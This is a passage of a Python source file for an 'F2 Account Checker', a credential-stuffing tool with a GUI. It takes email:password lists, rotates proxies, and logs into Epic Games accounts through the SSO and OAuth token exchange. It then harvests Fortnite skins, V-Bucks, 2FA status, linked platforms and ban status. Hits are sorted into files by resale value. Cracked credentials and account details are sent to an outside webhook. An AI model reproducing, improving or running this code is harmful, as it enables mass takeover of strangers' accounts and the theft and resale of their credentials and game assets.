            "Referer": "https://www.epicgames.com/id/login/xbl?lang=en-US&redirect_uri=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4&prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiIxZjg2NDVjMDNkNDk0NWVlOTBiYTU5MTE1OTQyNTI5MCIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9zdG9yZS5lcGljZ2FtZXMuY29tL2VuLVVTLyIsImlzV2ViIjp0cnVlLCJpcCI6IjExNS4xODcuNTguMTY0Iiwib3JpZ2luIjoiZXBpY2dhbWVzIiwiaWQiOiI4ZDVjNWVjMWVkZTI0ZjNmYWQzODRkMWU4Y2QxNWVmNiIsImNvZGUiOiJNLkM1NDVfQkwyLjIuVS40NGFhNmNlNi1lZWJlLTJjMzUtYTgyNi05YWIxZGE1NWYzNDAifQ%253D%253D",
            "Sec-Ch-Ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        }
        current_url = sso_url
        for _ in range(10):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_sso = scraper.get(current_url, headers=sso_headers, allow_redirects=False, cookies=resp_redirect.cookies, proxies=proxy_dict, timeout=self.timeout)
                if 'Location' in resp_sso.headers:
                    loc = resp_sso.headers['Location']
                    if 'https://www.fortnite.com/id/api/sso?' in loc:
                        current_url = loc
                        continue
                    elif 'eg1~' in resp_sso.cookies.get('REFRESH_EPIC_EG1', ''):
                        break
                    else:
                        current_url = loc
                        continue
                else:
                    if 'REFRESH_EPIC_EG1' in resp_sso.cookies and resp_sso.cookies['REFRESH_EPIC_EG1'].startswith('eg1~'):
                        break
                    else:
                        continue
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        # Parse display info
        display_name, country, accid, email_verified = self.parse_account_info(resp_sso.text)

        # Get exchange code
        exchange_url = "https://www.epicgames.com/id/api/redirect?"
        exchange_headers = {
            "Host": "www.epicgames.com",
            "Connection": "keep-alive",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/16.7.0-34134031+++Portal+Release-Live UnrealEngine/4.27.0-34134031+++Portal+Release-Live Chrome/90.0.4430.212 Safari/537.36",
            "X-Epic-Access-Key": "undefined",
            "X-Epic-Client-ID": "undefined",
            "X-Epic-Display-Mode": "web",
            "X-Epic-Duration": "375170",
            "X-Epic-Event-Action": "reminder",
            "X-Epic-Event-Category": "login",
            "X-Epic-Flow": "login",
            "X-Epic-Platform": "WEB",
            "X-Epic-Strategy-Flags": "isolatedTestFlagEnabled=false",
            "X-Requested-With": "XMLHttpRequest",
            "X-XSRF-TOKEN": xsrf_token,
            "sec-ch-ua": '"Chromium";v="90"',
            "sec-ch-ua-mobile": "?0",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.epicgames.com/id/login",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate"
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_ex = scraper.get(exchange_url, headers=exchange_headers, cookies=resp_sso.cookies, proxies=proxy_dict, timeout=self.timeout)
                ex_match = re.search(r'"exchangeCode":"(.*?)"', resp_ex.text)
                if ex_match:
                    exchange_code = ex_match.group(1)
                    break
                else:
                    continue
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        # Get access token
        token_url = "https://account-public-service-prod.ak.epicgames.com/account/api/oauth/token"
        token_payload = {
            "grant_type": "exchange_code",
            "exchange_code": exchange_code,
            "token_type": "eg1"
        }
        token_headers = {
            "Host": "account-public-service-prod.ak.epicgames.com",
            "Accept": "*/*",
            "X-Epic-Correlation-ID": "UE4-0cb999094c593037703e67a2364dad7a-63523E0D4DA6FA14E96DC9A5AC137A03-3E1FA7274351413FF9E430829D1920FC",
            "User-Agent": "UELauncher/16.7.0-34134031+++Portal+Release-Live Windows/10.0.19045.1.256.64bit",
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y=",
            "Accept-Encoding": "gzip, deflate"
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_token = scraper.post(token_url, data=token_payload, headers=token_headers, proxies=proxy_dict, timeout=self.timeout)
                if resp_token.status_code == 200:
                    token_data = resp_token.json()
                    access_token = token_data.get('access_token')
                    account_id = token_data.get('account_id')
                    if access_token and account_id:
                        break
                else:
                    continue
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        # Second exchange for refresh token
        exchange2_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
        exchange2_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Authorization": f"bearer {access_token}"
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_ex2 = scraper.get(exchange2_url, headers=exchange2_headers, proxies=proxy_dict, timeout=self.timeout)
                if resp_ex2.status_code == 200:
                    ex2 = resp_ex2.json().get('code')
                    if ex2:
                        break
                else:
                    continue
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        refresh_token_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
        refresh_payload = {
            "grant_type": "exchange_code",
            "exchange_code": ex2
        }
        refresh_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_ref = scraper.post(refresh_token_url, data=refresh_payload, headers=refresh_headers, proxies=proxy_dict, timeout=self.timeout)
                if resp_ref.status_code == 200:
                    refresh_token = resp_ref.json().get('refresh_token')
                    if refresh_token:
                        break
                else:
                    continue
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        final_token_payload = {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_final = scraper.post(refresh_token_url, data=final_token_payload, headers=refresh_headers, proxies=proxy_dict, timeout=self.timeout)
                if resp_final.status_code == 200:
                    final_access = resp_final.json().get('access_token')
                    if final_access:
                        break
                else:
                    continue
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        headers_auth_final = {
            "User-Agent": "UELauncher/11.0.2-14967703+++Portal+Release-Live Windows/10.0.19041.1.256.64bit",
            "Authorization": f"bearer {final_access}"
        }

        # Get external auths
        ext_url = f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}/externalAuths'
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_ext = scraper.get(ext_url, headers=headers_auth_final, proxies=proxy_dict, timeout=self.timeout)
                if resp_ext.status_code == 200:
                    break
                else:
                    continue
            except Exception:
                continue
        else:
            resp_ext = None

        linked = []
        if resp_ext and resp_ext.status_code == 200:
            platforms = {
                '"type":"xbl"': 'Xbox',
                '"type":"psn"': 'Playstation',
                '"type":"steam"': 'Steam',
                '"type":"twitch"': 'Twitch',
                '"type":"lego"': 'Lego',
                '"type":"nintendo"': 'Nintendo',
                '"type":"github"': 'Github'
            }
            for k, v in platforms.items():
                if k in resp_ext.text:
                    linked.append(v)

        # Wallet
        wallet_url = f'https://egs-platform-service.store.epicgames.com/api/v1/private/egs/account/wallet?locale=en&store=EGS'
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_wallet = scraper.get(wallet_url, headers=headers_auth_final, proxies=proxy_dict, timeout=self.timeout)
                if resp_wallet.status_code == 200:
                    balance = resp_wallet.json().get('epicRewards', {}).get('balance', 0)
                    break
                else:
                    continue
            except Exception:
                continue
        else:
            balance = 0

        # Account info
        account_info_url = f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{account_id}"
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_acc = scraper.get(account_info_url, headers=headers_auth_final, proxies=proxy_dict, timeout=self.timeout)
                if resp_acc.status_code == 200:
                    acc_data = resp_acc.json()
                    display_name = acc_data.get('displayName', display_name or 'Unknown')
                    country = acc_data.get('country', 'Unknown')
                    tfa_enabled = acc_data.get('tfaEnabled', False)
                    epic_email = acc_data.get('email', 'Unknown')
                    email_verified = acc_data.get('emailVerified', False)
                    break
                else:
                    continue
            except Exception:
                continue
        else:
            tfa_enabled = False
            epic_email = 'Unknown'

        # STW
        stw_url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/public/QueryPublicProfile?profileId=campaign"
        stw_headers = {
            "Authorization": f"Bearer {final_access}",
            "Content-Type": "application/json"
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_stw = scraper.post(stw_url, headers=stw_headers, json={}, proxies=proxy_dict, timeout=self.timeout)
                if resp_stw.status_code == 200:
                    has_stw = "YES" if "tutorial" in str(resp_stw.json()) else "NO"
                    break
                else:
                    continue
            except Exception:
                continue
        else:
            has_stw = "ERROR"

        # Athena profile
        athena_url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=athena&rvn=-1"
        athena_headers = {
            "User-Agent": "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit",
            "Authorization": f"Bearer {final_access}",
            "Content-Type": "application/json"
        }
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_athena = scraper.post(athena_url, headers=athena_headers, json={}, proxies=proxy_dict, timeout=self.timeout)
                if resp_athena.status_code == 200:
                    break
                else:
                    continue
            except Exception:
                continue
        else:
            with self.print_lock:
                self.stats.invalid += 1
            self.save_category(combo, "Invalid")
            return None

        athena_text = resp_athena.text
        if "Login is banned" in athena_text or "numericErrorCode\" : 1023," in athena_text or "messageVars\" : [ \"PLAY" in athena_text or resp_athena.status_code == 403:
            with self.print_lock:
                self.stats.fnban += 1
            self.save_category(combo, "FNBanned")
            self.save_result(combo, 'Fortnite', 'Banned.txt')
            return None

        data = resp_athena.json()
        level_pattern = re.compile(r'"accountLevel"\s*:\s*(\d+)')
        total_wins_pattern = re.compile(r'"lifetime_wins"\s*:\s*(\d+)')
        level_match = level_pattern.search(athena_text)
        level = level_match.group(1) if level_match else 'N/A'
        total_wins_match = total_wins_pattern.search(athena_text)
        total_wins = total_wins_match.group(1) if total_wins_match else 'N/A'

        past_seasons = data.get('profileChanges', [{}])[0].get('profile', {}).get('stats', {}).get('attributes', {}).get('past_seasons', [])
        first_active_season = None
        for season in past_seasons:
            try:
                if season.get('seasonXp', 0) > 0:
                    if first_active_season is None or season.get('seasonNumber', 0) < first_active_season.get('seasonNumber', 0):
                        first_active_season = season
            except:
                continue
        first_active_season = first_active_season.get('seasonNumber', 'N/A') if first_active_season else 'N/A'

        # Skin parsing
        skin_db = {}
        db_path = Path('skins_database.txt')
        if db_path.exists():
            with open(db_path, 'r', encoding='utf-8') as f:
                for line in f:
                    if ':' in line:
                        k, v = line.strip().split(':', 1)
                        skin_db[k.lower()] = v

        skins = []
        exclusive_skins = []
        def search_skins(obj):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    if key == "templateId" and isinstance(value, str) and value.startswith("AthenaCharacter:"):
                        skin_id = value.split(":")[1]
                        skin_name = skin_db.get(skin_id.lower())
                        if not skin_name:
                            try:
                                url = f'https://fortnite-api.com/v2/cosmetics/br/{skin_id}'
                                r = requests.get(url, timeout=self.timeout)
                                if r.status_code == 200:
                                    skin_name = r.json().get('data', {}).get('name', skin_id)
                                    with open(db_path, 'a', encoding='utf-8') as f:
                                        f.write(f'{skin_id}:{skin_name}\n')
                                    skin_db[skin_id.lower()] = skin_name
                                else:
                                    skin_name = skin_id
                            except:
                                skin_name = skin_id
                        exclusive_list = ['glow', 'eon', 'dark skully', 'rogue spider knight', 'black knight',
                                          'skull trooper', 'ghoul trooper', 'omega', 'blitz', 'havoc', 'john wick',
                                          'blue striker', 'prodigy', 'galaxy', 'blue team leader', 'royal knight',
                                          'stealth reflex', 'sub commander', 'chun-li', 'huntmaster saber',
                                          'the reaper', 'blue squire', 'royale knight', 'sparkle specialist',
                                          'brutus', 'midas', 'world cup', 'rogue agent', 'elite agent', 'trailblazer',
                                          'strong guard', 'rose team leader', 'warpaint', 'travis', 'eddie brock',
                                          'master chief', 'fresh', 'aerial assault trooper', 'ikonik', 'reflex']
                        if skin_name.lower() in exclusive_list:
                            exclusive_skins.append(skin_name)
                        skins.append(skin_name)
                    else:
                        search_skins(value)
            elif isinstance(obj, list):
                for item in obj:
                    search_skins(item)

        search_skins(data)
        unique_skins = list(dict.fromkeys(skins))
        total_skins = len(unique_skins)

        # Other cosmetics
        dances = []
        gliders = []
        pickaxes = []
        backpacks = []
        def search_items(obj):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    if key == "templateId" and isinstance(value, str):
                        if value.startswith("AthenaDance:eid_"):
                            dances.append(value)
                        elif value.startswith("AthenaGlider:"):
                            gliders.append(value)
                        elif value.startswith("AthenaPickaxe:"):
                            pickaxes.append(value)
                        elif value.startswith("AthenaBackpack:"):
                            backpacks.append(value)
                    else:
                        search_items(value)
            elif isinstance(obj, list):
                for item in obj:
                    search_items(item)
        search_items(data)
        total_dances = len(dances)
        total_gliders = len(gliders)
        total_pickaxes = len(pickaxes)
        total_backpacks = len(backpacks)

        # VBucks
        vbucks_url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core&rvn=-1"
        vbucks_headers = {
            "User-Agent": "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit",
            "Authorization": f"bearer {final_access}",
            "Content-Type": "application/json"
        }
        vbucks = 0
        for attempt in range(self.retries + 1):
            try:
                proxy_dict = self.get_proxy_dict(random.choice(self.proxies) if self.proxies else None)
                resp_vb = scraper.post(vbucks_url, headers=vbucks_headers, json={}, proxies=proxy_dict, timeout=self.timeout)
                if resp_vb.status_code == 200:
                    vdata = resp_vb.json()
                    items = vdata.get('profileChanges', [{}])[0].get('profile', {}).get('items', {})
                    for item_id, item in items.items():
                        if 'Currency:Mtx' in item.get('templateId', ''):
                            vbucks += item.get('quantity', 0)
                    break
                else:
                    continue
            except Exception:
                continue
        else:
            vbucks = 0

        # FA/NFA
        fullAccess = 'NFA'
        outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr"]
        if epic_email.lower() == email.lower() and any(domain in email.lower() for domain in outlook_domains):
            fullAccess = 'FA'

        with self.print_lock:
            self.stats.hits += 1
            if has_stw == 'YES':
                self.stats.stw += 1
            if first_active_season != 'N/A' and int(first_active_season) <= 4:
                self.stats.og += 1

        self.stats.sellerstuff.append({
            'fullAccess': fullAccess,
            '2fa': tfa_enabled,
            'total_skins': total_skins,
            'skins_list': unique_skins,
            'exclusive': len(exclusive_skins) > 0,
            'exclusives_list': exclusive_skins,
            'mail_verified': email_verified,
            'last_login': 'N/A',
            'linked_accs': linked,
            'balance': balance,
            'level': level,
            'vbucks': vbucks,
            'total_wins': total_wins,
            'first_season': first_active_season,
            'total_dances': total_dances,
            'total_gliders': total_gliders,
            'total_pickaxes': total_pickaxes,
            'total_backpacks': total_backpacks,
            'has_stw': has_stw,
            'display_name': display_name,
            'country': country,
            'epic_email': epic_email
        })

        # Save full hit (already done in save_hit, but also category)
        self.save_category(combo, "Hit")
        self.save_hit(combo, display_name, fullAccess, epic_email, tfa_enabled, linked,
                      balance, has_stw, level, vbucks, total_wins, first_active_season,
                      total_dances, total_gliders, total_pickaxes, total_backpacks,
                      exclusive_skins, unique_skins, total_skins)

        if self.webhook:
            self.send_webhook(combo, display_name, fullAccess, total_skins, vbucks, tfa_enabled, has_stw, level, total_wins, exclusive_skins)

        return {'combo': combo, 'fullAccess': fullAccess, 'total_skins': total_skins}

    # ------------------------------------------------------------------
    # Helper methods for saving results (legacy detailed saves)
    def save_result(self, combo: str, subfolder: str, filename: str):
        path = Path(self.folder) / subfolder
        path.mkdir(parents=True, exist_ok=True)
        with open(path / filename, 'a', encoding='utf-8') as f:
            f.write(combo + '\n')

    def save_hit(self, combo, display_name, fullAccess, epic_email, tfa, linked,
                 balance, has_stw, level, vbucks, wins, first_season,
                 dances, gliders, pickaxes, backpacks, exclusives, skins, total_skins):
        path = Path(self.folder) / 'Fortnite'
        path.mkdir(parents=True, exist_ok=True)
        with open(path / 'all.txt', 'a', encoding='utf-8') as f:
            f.write(combo + '\n')
        category = ''
        if exclusives:
            category = 'Exclusive'
        elif total_skins >= 300:
            category = '300+Skins'
        elif total_skins >= 200:
            category = '200-299Skins'
        elif total_skins >= 100:
            category = '100-199Skins'
        elif total_skins >= 50:
            category = '50-99Skins'
        elif total_skins >= 10:
            category = '10-49Skins'
        elif total_skins >= 1:
            category = '1-9Skins'
        else:
            category = '0Skins'
        cat_path = path / category
        cat_path.mkdir(exist_ok=True)
        message = (f"{combo} | Name: {display_name} | FullAccess: {fullAccess} | "
                   f"Email Verified: {email_verified} | Linked: {linked} | "
                   f"2FA: {tfa} | Balance: {balance} | STW: {has_stw} | Level: {level} | "
                   f"VBucks: {vbucks} | Wins: {wins} | First Season: {first_season} | "
                   f"Emotes: {dances} | Gliders: {gliders} | Pickaxes: {pickaxes} | Backblings: {backpacks}\n"
                   f"Skins: [{total_skins}] {', '.join(skins)}\n"
                   f"Exclusives: [{len(exclusives)}] {', '.join(exclusives)}\n"
                   "============================")
        with open(cat_path / f'{total_skins}Skins_{fullAccess}.txt', 'a', encoding='utf-8') as f:
            f.write(message + '\n')

    def send_webhook(self, combo, display_name, fullAccess, total_skins, vbucks, tfa, has_stw, level, wins, exclusives):
        if not self.webhook_id:
            return
        payload = {
            "username": "F2",
            "avatar_url": "https://fortnite-api.com/images/cosmetics/br/character_quickburst_plains/icon.png",
            "embeds": [{
                "title": display_name,
                "color": 15054874,
                "fields": [
                    {"name": "Email:Password", "value": f"||{combo}||"},
                    {"name": "Wins", "value": str(wins)},
                    {"name": "Level", "value": str(level)},
                    {"name": "Vbucks", "value": str(vbucks)},
                    {"name": "Skin Count", "value": str(total_skins)},
                    {"name": "2FA", "value": str(tfa)},
                    {"name": "STW", "value": has_stw},
                    {"name": "Exclusive Skins", "value": str(exclusives)},
                    {"name": "Account Type", "value": fullAccess}
                ],
                "footer": {"text": "F2"}
            }]
        }
        try:
            requests.post(self.webhook_id, json=payload, timeout=5)
        except:
            pass

    def parse_account_info(self, text: str) -> Tuple[str, str, str, bool]:
        display_name = 'Unknown'
        country = 'Unknown'
        accid = 'Unknown'
        email_verified = False
        try:
            match = re.search(r'"displayName":"(.*?)"', text)
            if match:
                display_name = match.group(1)
            match = re.search(r'"country":"(.*?)"', text)
            if match:
                country = match.group(1)
            match = re.search(r'"id":"(.*?)"', text)
            if match:
                accid = match.group(1)
            match = re.search(r'"emailVerified":(true|false)', text)
            if match:
                email_verified = match.group(1).lower() == 'true'
        except:
            pass
        return display_name, country, accid, email_verified

    # ------------------------------------------------------------------
    # Main run method
    def run(self):
        self.running = True
        unix = datetime.now().strftime('%d-%m-%Y_%H-%M-%S')
        self.folder = str(Path('Results') / f'Normal_Mode_{unix}')
        Path(self.folder).mkdir(parents=True, exist_ok=True)

        self.log("Loading combos...")
        combos = self.load_combos()
        if not combos:
            self.log("No combos loaded. Aborting.", "error")
            self.running = False
            return
        self.stats.total = len(combos)

        if self.use_proxy or self.proxy_api:
            self.log("Loading proxies...")
            proxies = self.load_proxies()
            self.proxies = proxies if proxies else []
            if not self.proxies:
                self.log("No proxies loaded. Continuing without proxies.", "warning")
        else:
            self.proxies = []

        self.log(f"Starting check with {len(combos)} accounts, {self.threads} threads.")

        # Start CPM counter thread
        threading.Thread(target=self.cpm_counter, daemon=True).start()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.check_account, combo) for combo in combos]
            for future in as_completed(futures):
                if not self.running:
                    break
                with self.print_lock:
                    self.stats.checked += 1
                pct = (self.stats.checked / self.stats.total) * 100
                self.update_progress(pct, f"Checked {self.stats.checked}/{self.stats.total}")
                self.update_stats()

        self.running = False
        self.log("Checking complete.")
        self.update_progress(100, "Done")

    def cpm_counter(self):
        """Calculate checks per minute."""
        start = self.stats.start_time
        last_checked = 0
        while self.running:
            time.sleep(5)
            with self.print_lock:
                checked = self.stats.checked
            elapsed = time.time() - start
            if elapsed > 0:
                cpm = (checked / elapsed) * 60
                with self.print_lock:
                    self.stats.cpm = int(cpm)
            self.update_stats()

# ----------------------------------------------------------------------
# GUI Application
class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("F2 - Account Checker")
        self.geometry("900x720")
        self.minsize(800, 600)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        # Splash
        self.splash = ctk.CTkToplevel(self)
        self.splash.title("Loading...")
        self.splash.geometry("400x200")
        self.splash.attributes("-topmost", True)
        self.splash.transient(self)
        self.splash.grab_set()

        splash_frame = ctk.CTkFrame(self.splash, corner_radius=20)
        splash_frame.pack(expand=True, fill="both", padx=30, pady=30)

        ctk.CTkLabel(splash_frame, text="F2 Checker", font=("Segoe UI", 28, "bold"), text_color="#00ccff").pack(pady=(10,5))
        self.progress_splash = ctk.CTkProgressBar(splash_frame, width=250, height=15, corner_radius=10)
        self.progress_splash.pack(pady=10)
        self.progress_splash.set(0)
        self.splash_status = ctk.CTkLabel(splash_frame, text="Initializing...", font=("Segoe UI", 12))
        self.splash_status.pack(pady=5)

        self.load_steps = [
            ("Loading configuration...", 10),
            ("Checking directories...", 25),
            ("Loading modules...", 50),
            ("Preparing interface...", 75),
            ("Ready!", 100)
        ]
        self.splash_step = 0
        self.after(100, self.update_splash)
        self.after(2500, self.show_main)

        # Config variables
        self.config = load_config()
        self.threads_var = IntVar(value=self.config['checker']['threads'])
        self.timeout_var = IntVar(value=self.config['checker']['timeout'])
        self.retries_var = IntVar(value=self.config['checker']['retries'])
        self.use_proxy_var = BooleanVar(value=self.config['checker']['proxy']['proxy'])
        self.proxy_type_var = StringVar(value=self.config['checker']['proxy']['proxy_type'])
        self.proxy_api_var = BooleanVar(value=self.config['checker']['proxy']['proxy_api'])
        self.proxy_api_link_var = StringVar(value=self.config['checker']['proxy']['api_link'])
        self.webhook_var = BooleanVar(value=self.config['checker']['webhook']['Webhook'])
        self.webhook_id_var = StringVar(value=self.config['checker']['webhook']['WebhookID'])
        self.save_bad_var = BooleanVar(value=self.config['checker']['save_bad'])

        # Stats variables
        self.stats_hits = StringVar(value="0")
        self.stats_invalid = StringVar(value="0")
        self.stats_valid_mail = StringVar(value="0")
        self.stats_twofa = StringVar(value="0")
        self.stats_locked = StringVar(value="0")
        self.stats_fnban = StringVar(value="0")
        self.stats_headless = StringVar(value="0")
        self.stats_stw = StringVar(value="0")
        self.stats_og = StringVar(value="0")
        self.stats_retries = StringVar(value="0")
        self.stats_cpm = StringVar(value="0")
        self.stats_checked = StringVar(value="0")
        self.stats_total = StringVar(value="0")

        self.checker = None
        self.check_thread = None

    def update_splash(self):
        if self.splash_step < len(self.load_steps):
            text, value = self.load_steps[self.splash_step]
            self.splash_status.configure(text=text)
            self.progress_splash.set(value / 100)
            self.splash_step += 1
            self.after(300, self.update_splash)
        else:
            self.splash.after(500, self.splash.destroy)

    def show_main(self):
        # Layout
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=0)
        self.grid_rowconfigure(1, weight=1)
        self.grid_rowconfigure(2, weight=0)

        # Title
        title_frame = ctk.CTkFrame(self, corner_radius=15, border_width=2, border_color="#00ccff")
        title_frame.grid(row=0, column=0, padx=20, pady=(20,10), sticky="ew")
        title_frame.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(title_frame, text="F2 Checker", font=("Segoe UI", 24, "bold"), text_color="#00ccff").grid(row=0, column=0, pady=10)

        # Main content
        content_frame = ctk.CTkFrame(self, corner_radius=10, fg_color="transparent")
        content_frame.grid(row=1, column=0, padx=20, pady=5, sticky="nsew")
        content_frame.grid_columnconfigure(0, weight=1)
        content_frame.grid_columnconfigure(1, weight=2)
        content_frame.grid_rowconfigure(0, weight=1)

        # Left: Config
        config_frame = ctk.CTkFrame(content_frame, corner_radius=15, border_width=2, border_color="#2b2b2b")
        config_frame.grid(row=0, column=0, padx=(0,10), sticky="nsew")
        config_frame.grid_rowconfigure(10, weight=1)
        ctk.CTkLabel(config_frame, text="⚙️ Configuration", font=("Segoe UI", 16, "bold")).grid(row=0, column=0, padx=15, pady=(15,10), sticky="w")

        ctk.CTkLabel(config_frame, text="Threads:").grid(row=1, column=0, padx=15, pady=5, sticky="w")
        ctk.CTkEntry(config_frame, textvariable=self.threads_var, width=80).grid(row=1, column=1, padx=5, pady=5, sticky="w")

        ctk.CTkLabel(config_frame, text="Timeout (ms):").grid(row=2, column=0, padx=15, pady=5, sticky="w")
        ctk.CTkEntry(config_frame, textvariable=self.timeout_var, width=80).grid(row=2, column=1, padx=5, pady=5, sticky="w")

        ctk.CTkLabel(config_frame, text="Retries:").grid(row=3, column=0, padx=15, pady=5, sticky="w")
        ctk.CTkEntry(config_frame, textvariable=self.retries_var, width=80).grid(row=3, column=1, padx=5, pady=5, sticky="w")

        ctk.CTkCheckBox(config_frame, text="Use Proxy", variable=self.use_proxy_var).grid(row=4, column=0, columnspan=2, padx=15, pady=5, sticky="w")
        ctk.CTkLabel(config_frame, text="Proxy Type:").grid(row=5, column=0, padx=15, pady=5, sticky="w")
        ctk.CTkOptionMenu(config_frame, values=["HTTP", "HTTPS", "SOCKS4", "SOCKS5"], variable=self.proxy_type_var).grid(row=5, column=1, padx=5, pady=5, sticky="w")

        ctk.CTkCheckBox(config_frame, text="Use Proxy API", variable=self.proxy_api_var).grid(row=6, column=0, columnspan=2, padx=15, pady=5, sticky="w")
        ctk.CTkEntry(config_frame, textvariable=self.proxy_api_link_var, placeholder_text="API URL", width=180).grid(row=7, column=0, columnspan=2, padx=15, pady=5, sticky="w")

        ctk.CTkCheckBox(config_frame, text="Webhook", variable=self.webhook_var).grid(row=8, column=0, columnspan=2, padx=15, pady=5, sticky="w")
        ctk.CTkEntry(config_frame, textvariable=self.webhook_id_var, placeholder_text="Webhook URL", width=180).grid(row=9, column=0, columnspan=2, padx=15, pady=5, sticky="w")

        ctk.CTkCheckBox(config_frame, text="Save Bad", variable=self.save_bad_var).grid(row=10, column=0, columnspan=2, padx=15, pady=5, sticky="w")

        # Right: Stats and Log
        right_frame = ctk.CTkFrame(content_frame, corner_radius=15, border_width=2, border_color="#2b2b2b")
        right_frame.grid(row=0, column=1, padx=(10,0), sticky="nsew")
        right_frame.grid_rowconfigure(0, weight=0)
        right_frame.grid_rowconfigure(1, weight=1)
        right_frame.grid_rowconfigure(2, weight=0)

        # Stats grid
        stats_frame = ctk.CTkFrame(right_frame, fg_color="transparent")
        stats_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        for i in range(6):
            stats_frame.grid_columnconfigure(i, weight=1)

        # Row 0
        ctk.CTkLabel(stats_frame, text="✅ Hits:", font=("Segoe UI", 14, "bold"), text_color="#00ff88").grid(row=0, column=0, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_hits, font=("Segoe UI", 14), text_color="white").grid(row=0, column=1, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, text="❌ Invalid:", font=("Segoe UI", 14, "bold"), text_color="#ff5555").grid(row=0, column=2, padx=5, pady=2, sticky="w")
        ctk.CTkLabel(stats_frame, textvariable=self.stats_invalid, font=("Segoe UI", 14), text_color="white").grid(row=0, column=3, padx=5, pady=2, sticky="w")
